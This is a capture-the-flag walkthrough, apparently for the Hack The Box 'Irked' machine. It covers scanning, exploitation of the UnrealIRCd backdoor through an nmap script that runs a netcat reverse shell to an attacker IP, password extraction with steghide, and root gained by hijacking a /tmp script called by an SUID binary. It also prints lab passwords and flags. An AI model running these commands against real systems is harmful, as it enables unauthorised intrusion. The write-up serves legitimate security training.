<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="content-type"/>
<title>irked</title>
<meta content="CherryTree" name="generator"/>
<link href="styles.css" rel="stylesheet" type="text/css"/>
</head>
<body><div class="main"><div class="tree">
<p><a href="../HacktheBox--Linux_Boxes.html">Linux Boxes</a></p>
<p><a href="#irked">irked</a></p>
<ol>
<li><a href="#nmap">nmap</a></li>
<li><a href="#http">http</a></li>
<ol>
<li><a href="#gobuster">gobuster</a></li>
</ol>
<li><a href="#initial foothold UnrealIRCd">initial foothold UnrealIRCd</a></li>
<ol>
<li><a href="#Nmap script engine">Nmap script engine</a></li>
<ol>
<li><a href="#nmap unrealirc backdoor">nmap unrealirc backdoor</a></li>
<li><a href="#nmap backdoor nse">nmap backdoor nse</a></li>
</ol>
<li><a href="#user.txt">user.txt</a></li>
</ol>
<li><a href="#steghide challenge">steghide challenge</a></li>
<ol>
<li><a href="#steghide">steghide</a></li>
<li><a href="#konami code">konami code</a></li>
<li><a href="#djmardov">djmardov</a></li>
</ol>
<li><a href="#privesc">privesc</a></li>
<ol>
<li><a href="#lse.sh">lse.sh</a></li>
<ol>
<li><a href="#Report findings">Report findings</a></li>
</ol>
<li><a href="#viewuser">viewuser</a></li>
</ol>
<li><a href="#user/root">user/root</a></li>
<li><a href="#lessons learned">lessons learned</a></li>
</ol></div>
<div class="page"><h1><b><u>irked</u></b></h1><img alt="images/756-1.png" src="images/756-1.png"/><br/><img alt="images/756-2.png" src="images/756-2.png"/></div>
</body></html><div class="page" id="irked"><h1><b><u>irked</u></b></h1><img alt="images/756-1.png" src="images/756-1.png"/><br/><img alt="images/756-2.png" src="images/756-2.png"/></div>
<div class="page" id="nmap"><h1><b><u>nmap</u></b></h1><span style="color:#24ff00;">Initial nmap port scan reveals ssh on port 22, http on port 80 and rpcbind on port 111, lets see if there are any ports the initial scan missed</span><br/><img alt="images/757-1.png" src="images/757-1.png"/><br/><br/><br/><span style="color:#24ff00;">see we have a few services running that weren't caught in the first scan, lets run a targeted scan on those ports next:</span><br/><img alt="images/757-2.png" src="images/757-2.png"/><br/><br/><span style="color:#ffa500;">nmap -sV -sC -p 22,80,111,6697,8067,56600,65534 -oA nmap/targeted 10.10.10.117</span><br/><img alt="images/757-3.png" src="images/757-3.png"/><br/><span style="color:#24ff00;">our targeted scan returned the following services:</span><br/><span style="color:#ffa500;">irc</span><span style="color:#24ff00;"> on ports</span><span style="color:#ffa500;"> 6697, 8067 and 65534</span><br/><span style="color:#24ff00;">another </span><span style="color:#ffa500;">rpcbind</span><span style="color:#24ff00;"> service on port </span><span style="color:#ffa500;">56600</span><br/><br/><br/></div>
<div class="page" id="http"><h1><b><u>http</u></b></h1><img alt="images/1969-1.png" src="images/1969-1.png"/></div>
<div class="page" id="gobuster"><h1><b><u>gobuster</u></b></h1><img alt="images/760-1.png" src="images/760-1.png"/><br/><br/><br/><span style="color:#ffa500;">/manual</span><span style="color:#24ff00;"> was found so lets peek at that real fast</span><br/><img alt="images/760-2.png" src="images/760-2.png"/><br/><br/><span style="color:#24ff00;">nothing important, lets move on to other enumeration tool</span></div>
<div class="page" id="initial foothold UnrealIRCd"><h1><b><u>initial foothold UnrealIRCd</u></b></h1><span style="color:#24ff00;">Our targetred scan showed UnrealIRCd running on 3 seperate ports, lets do a little Open source information to see what we can find out<br/><br/></span><img alt="images/767-1.png" src="images/767-1.png"/><br/></div>
<div class="page" id="Nmap script engine"><h1><b><u>Nmap script engine</u></b></h1><span style="color:#24ff00;">lets see if there are any </span><span style="color:#ffa500;">nmap scripts </span><span style="color:#24ff00;">to check IRC services for vulnerabilities<br/><br/></span><span style="color:#ffa500;">ls -l /usr/share/nmap/scripts/irc* </span><span style="color:#24ff00;"><br/>where</span><span style="color:#ffa500;"> * </span><span style="color:#24ff00;">is a wildcard that will return all search results starting with irc<br/></span><img alt="images/763-1.png" src="images/763-1.png"/><br/><br/>we see <span style="color:#ffa500;">nmap</span><span style="color:#24ff00;"> has a backdoor script that checks to see if the </span><span style="color:#ffff00;">unrealircd</span><span style="color:#24ff00;"> service is susceptible to backdoors!<br/></span><img alt="images/763-2.png" src="images/763-2.png"/><br/><br/></div>
<div class="page" id="nmap unrealirc backdoor"><h1><b><u>nmap unrealirc backdoor</u></b></h1><span style="color:#24ff00;">according to our nmap scan, </span><span style="color:#ffa500;">IRC</span><span style="color:#24ff00;"> is running on ports </span><span style="color:#ffa500;">6679</span><span style="color:#24ff00;">,</span><span style="color:#ffa500;"> 8067, 65534</span><span style="color:#24ff00;">, lets check them for the irc backdoor vulnerability:<br/><br/>generates us the following report:<br/></span><img alt="images/764-1.png" src="images/764-1.png"/><br/><span style="color:#ffa500;">port 8067 </span><span style="color:#24ff00;">is </span><span style="color:#ffff00;">vulnerable</span><span style="color:#24ff00;">! <br/>Lets use </span><span style="color:#ffa500;">nmap</span><span style="color:#24ff00;"> nse to generate a backdoor with the </span><span style="color:#ffa500;">--script</span><span style="color:#24ff00;"> parameter</span></div>
<div class="page" id="nmap backdoor nse"><h1><b><u>nmap backdoor nse</u></b></h1><span style="color:#24ff00;">to write a command within an nmap script, add the </span><span style="color:#ffa500;">--script-args</span><span style="color:#24ff00;"> tag and set it equal to </span><span style="color:#ffa500;">irc-unrealirc-backdoor.command="nc -e /bin/bash 10.10.14.62 4444"</span><br/><br/><span style="color:#ffa500;">nmap -p 8067 --script=irc-unrealircd-backdoor --script-args=irc-unrealircd-backdoor.command="nc -e /bin/bash 10.10.14.62 4444" 10.10.10.117</span><br/><img alt="images/765-1.png" src="images/765-1.png"/><br/><br/><span style="color:#24ff00;">after about a minute we see</span><br/><img alt="images/765-2.png" src="images/765-2.png"/><br/><br/><span style="color:#24ff00;">check back to our netcat listener and we find we have a </span><span style="color:#ffff00;">shell</span><span style="color:#24ff00;">!</span><br/><img alt="images/765-3.png" src="images/765-3.png"/><br/><br/><span style="color:#24ff00;">lets spawn a shell with python with tab auto completion here</span><br/><span style="color:#ffa500;">python -c ‘import pty;pty.spawn("/bin/bash")’</span><br/><img alt="images/765-4.png" src="images/765-4.png"/><br/><br/><span style="color:#ffa500;">CTRL+Z </span><span style="color:#24ff00;">to background the session <br/></span><span style="color:#ffa500;">raw stty -echo</span><span style="color:#24ff00;"> to forward tab autocomplete to our shell<br/>and then ‘</span><span style="color:#ffa500;">fg</span><span style="color:#24ff00;">’ to foreground the session</span><br/><img alt="images/765-5.png" src="images/765-5.png"/><br/><br/><br/></div>
<div class="page" id="user.txt"><h1><b><u>user.txt</u></b></h1><span style="color:#24ff00;">lets see if we can grab the user flag as irked by running locate<br/><br/></span><img alt="images/782-1.png" src="images/782-1.png"/><br/><br/>Seems the file is in the <span style="color:#ffa500;">Documents</span><span style="color:#24ff00;"> folder instead of the </span><span style="color:#ffa500;">Desktop</span><span style="color:#24ff00;"> folder, a little peculular compared to other boxes<br/></span><img alt="images/782-2.png" src="images/782-2.png"/><br/><br/>seems we do not have permission, lets run<span style="color:#ffa500;"> ls -la </span><span style="color:#24ff00;">on the folder to see if theres anything else interesting<br/></span><img alt="images/782-3.png" src="images/782-3.png"/><br/><br/>.backup seems literesting, lets check it out<br/><img alt="images/782-4.png" src="images/782-4.png"/><br/><br/><span style="color:#ffff00;">super elite </span><span style="color:#ffa500;">steg</span><span style="color:#ffff00;"> backup password</span><span style="color:#24ff00;">? <br/>Interesting, there was a </span><span style="color:#ffff00;">picture</span><span style="color:#24ff00;"> irked's webpage we can take a look at that may have some clues for us </span></div>
<div class="page" id="steghide challenge"><h1><b><u>steghide challenge</u></b></h1><span style="color:#24ff00;">the image from irked's webpage may be hiding some sensitive information in it, lets take a look</span><br/><br/><img alt="images/780-1.png" src="images/780-1.png"/><img alt="images/780-2.png" src="images/780-2.png"/><br/><br/><img alt="images/780-3.png" src="images/780-3.png"/><br/><br/><span style="color:#24ff00;">here's </span><span style="color:#ffa500;">steg's</span><span style="color:#24ff00;"> manual:</span><br/><img alt="images/780-4.png" src="images/780-4.png"/><br/><img alt="images/780-5.png" src="images/780-5.png"/><br/><img alt="images/780-6.png" src="images/780-6.png"/><br/><br/></div>
<div class="page" id="steghide"><h1><b><u>steghide</u></b></h1><span style="color:#24ff00;">lets download steghide with</span><br/><span style="color:#ffa500;">sudo apt-get install steghide</span><br/><img alt="images/781-1.png" src="images/781-1.png"/><br/><br/><span style="color:#24ff00;">lets use the </span><span style="color:#ffff00;">super elite steg backup password</span><span style="color:#24ff00;"> </span><img alt="images/781-2.png" src="images/781-2.png"/> from the <span style="color:#ffa500;">.backup</span><span style="color:#24ff00;"> file we looked at earlier</span><br/><br/><br/><span style="color:#24ff00;">lets take another look at the extracting options steg gave us in the manual to see what we need to do<br/></span><img alt="images/781-3.png" src="images/781-3.png"/><br/><br/>lets use steghide extract <br/><span style="color:#ffa500;">steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss</span><span style="color:#24ff00;"><br/>where </span><span style="color:#ffa500;">-sf </span><span style="color:#24ff00;">is</span> <span style="color:#24ff00;">for the pic filename and <br/></span><span style="color:#ffa500;">-p </span><span style="color:#24ff00;">for the password<br/></span><img alt="images/781-4.png" src="images/781-4.png"/><br/><br/>it wrote our password out to <span style="color:#ffff00;">pass.txt</span><br/><img alt="images/781-5.png" src="images/781-5.png"/><br/><br/>perfect, <span style="color:#ffff00;">kab6h+m+bbp2j:hg</span><span style="color:#24ff00;"> is our password for djmardov<br/></span></div>
<div class="page" id="konami code"><h1><b><u>konami code</u></b></h1><span style="color:#24ff00;">just a fun tid bit but the supersecret password from our .backup file is taken from the famous konami code, it was used in various videogames for secret cheats to give your character infinite health along with other cheats!</span><br/><br/><img alt="images/783-1.png" src="images/783-1.png"/><br/><img alt="images/783-2.png" src="images/783-2.png"/></div>
<div class="page" id="djmardov"><h1><b><u>djmardov</u></b></h1><span style="color:#24ff00;">lets test our newly acquired </span><strong><span style="color:#ffff00;">Kab6h+m+bbp2J:HG </span></strong><span style="color:#24ff00;">password and swap over to djmardov so we can grab that user flag<br/></span><span style="color:#ffa500;">su -l djmardov</span><br/><img alt="images/784-1.png" src="images/784-1.png"/><br/><br/>we can also <span style="color:#ffa500;">ssh</span><span style="color:#24ff00;"> as </span><span style="color:#ffff00;">djmardov</span><br/><img alt="images/784-2.png" src="images/784-2.png"/><br/><br/>perfect, now lets grab that <span style="color:#ffff00;">user flag</span><br/><img alt="images/784-3.png" src="images/784-3.png"/><br/><span style="color:#ffff00;">4a66a78b12dc0e661a59d3f5c0267a8e</span><br/></div>
<div class="page" id="privesc"><h1><b><u>privesc</u></b></h1><span style="color:#24ff00;">Priv esc on this box is pretty straight forward, lets start with</span><span style="color:#ffa500;"> linux-smart-enumeration</span><span style="color:#24ff00;"> or the script of your choosing, </span><span style="color:#ffa500;">linPEAS</span><span style="color:#24ff00;"> works well too</span></div>
<div class="page" id="lse.sh"><h1><b><u>lse.sh</u></b></h1><span style="color:#24ff00;">I am becoming more and more acustomed to using linux-smart-enumeration for priv esc purposes due to its readability and its ability to use levels to put the most glaring vulnberabilities to the forefront of its report</span><br/><br/><span style="color:#ffa500;">./lse.sh -l 1</span><br/><span style="color:#24ff00;">where </span><span style="color:#ffa500;">-l</span><span style="color:#24ff00;"> is the level of output that is reported, </span><span style="color:#ffa500;">0</span><span style="color:#24ff00;">-only </span><span style="color:#ff0000;">critical finds </span><span style="color:#24ff00;">up to </span><span style="color:#ffa500;">2</span><span style="color:#24ff00;"> which outputs everything</span><br/><img alt="images/513-1.png" src="images/513-1.png"/><br/><br/><img alt="images/513-2.png" src="images/513-2.png"/><br/><br/>nothing interesting in the cron job department, we can tell because the *'s before each job indicate none of them run frequently enough<br/><img alt="images/513-3.png" src="images/513-3.png"/></div>
<div class="page" id="Report findings"><h1><b><u>Report findings</u></b></h1><span style="color:#ffa500;">Bash history </span><span style="color:#24ff00;">is always a good place to look for potential vulnerabilities and privesc opportunities</span><br/><br/><img alt="images/778-1.png" src="images/778-1.png"/><img alt="images/778-2.png" src="images/778-2.png"/><br/><br/><span style="color:#24ff00;">also this file being run with </span><span style="color:#ffff00;">suid bit </span><span style="color:#24ff00;">already set:</span><br/><br/><img alt="images/778-3.png" src="images/778-3.png"/><br/><br/><br/><br/></div>
<div class="page" id="viewuser"><h1><b><u>viewuser</u></b></h1><span style="color:#ffa500;">/usr/bin/viewuser</span><br/><img alt="images/779-1.png" src="images/779-1.png"/><br/><br/><span style="color:#24ff00;">we see the file calls </span><span style="color:#ffa500;">/tmp/listusers</span><span style="color:#24ff00;"> with root privileges, lets </span><span style="color:#ffa500;">cat</span><span style="color:#24ff00;"> the contents of that file</span><br/><img alt="images/779-2.png" src="images/779-2.png"/><br/><span style="color:#24ff00;"><br/>there is no listusers script in the </span><span style="color:#ffa500;">/tmp</span><span style="color:#24ff00;"> folder, so lets write our own and spawn a shell which will come along with the root privileges the suid assigns it</span><br/><span style="color:#ffa500;">echo "bash" &gt; /tmp/listusers</span><br/><img alt="images/779-3.png" src="images/779-3.png"/><br/><br/><span style="color:#24ff00;">seems we don't have permission to run viewuser which runs listusers, perhaps this issue has been patched</span><br/><span style="color:#ffa500;">chmod +x listusers</span><br/><span style="color:#24ff00;">lets give listusers execute priivileges and...<br/><br/></span><img alt="images/779-4.png" src="images/779-4.png"/><br/>we're <span style="color:#ffff00;">root</span><span style="color:#24ff00;">!</span><br/><br/></div>
<div class="page" id="user/root"><h1><b><u>user/root</u></b></h1><img alt="images/785-1.png" src="images/785-1.png"/><br/><span style="color:#ffff00;">4a66a78b12dc0e661a59d3f5c0267a8e<br/><br/></span><img alt="images/785-2.png" src="images/785-2.png"/><br/>8d8e9e8be64654b6dccc3bff4522daf3</div>
<div class="page" id="lessons learned"><h1><b><u>lessons learned</u></b></h1><span style="color:#24ff00;">Check out Rana Khalil's OSCP writeups and prep at</span> <a href="https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/">https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/</a><br/><br/><img alt="images/1970-1.png" src="images/1970-1.png"/></div>
</div></body></html>